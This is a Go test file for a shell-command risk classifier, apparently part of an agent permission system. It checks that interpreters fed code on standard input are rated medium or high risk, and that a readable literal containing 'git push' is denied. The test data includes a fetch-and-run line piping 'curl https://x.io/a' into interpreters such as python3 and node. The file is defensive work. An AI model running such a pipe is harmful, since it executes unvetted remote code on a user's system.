package classes_test

import (
	"strings"
	"testing"

	"github.com/lucasndas/mestre/internal/classes"
)

// A "-" operand of an interpreter is its standard input, not a file named
// "-" in the worktree: the code comes from the input, like bash -. Not even
// a repository that has a file called "-" makes it "a script of the
// project" (baixo).

// CA-RISCO-12
func TestDashIsTheStandardInputOfAnInterpreter(t *testing.T) {
	t.Parallel()
	m := newMachine()
	env := m.env()
	env.OS = "linux"
	env.Git = fakeGit{branch: "epico/42-login"} // every script reads as the repository's
	def := rules(t, "version: 1\n")
	free := rules(t, anyYAML)
	for _, p := range []string{"python3", "node", "ruby", "perl", "php", "lua", "python3 -u", "perl -w"} {
		// No producer: at least medio, never the baixo of a project script.
		for _, cmd := range []string{p + " -", p + " - arg", p + " - < in.txt"} {
			got := shellRisk(env, def, cmd)
			if got.Risk < classes.RiskMedium {
				t.Errorf("%q = %s (%s); want at least medio", cmd, got.Risk, got.Rule)
			}
			if strings.Contains(got.Rule, "script alterado na mesa") {
				t.Errorf("%q = %q: the input read as a script of the worktree", cmd, got.Rule)
			}
		}
		// A producer the motor cannot read: alto.
		for _, cmd := range []string{"cat f.txt | " + p + " -", "curl https://x.io/a | " + p + " -"} {
			wantRisk(t, env, def, cmd, classes.RiskHigh)
			if d := decide(env, free, m.shell(cmd)); d.Verdict == classes.Allow {
				t.Errorf("%q allowed under allow *: want at least ask", cmd)
			}
		}
		// A readable literal is analysed: a fixed rule in it denies.
		lit := "echo 'git push' | " + p + " -"
		want(t, decide(env, free, m.shell(lit)), classes.Deny, classes.LayerFixed, "git push")
		wantRisk(t, env, def, lit, classes.RiskFixed)
		// A harmless literal is medio: the motor does not read the code.
		wantRisk(t, env, def, "echo hello | "+p+" -", classes.RiskMedium)
	}
	// A script of the project is still baixo: only "-" changed.
	wantRisk(t, env, def, "python3 tools/ok.py", classes.RiskLow)
}
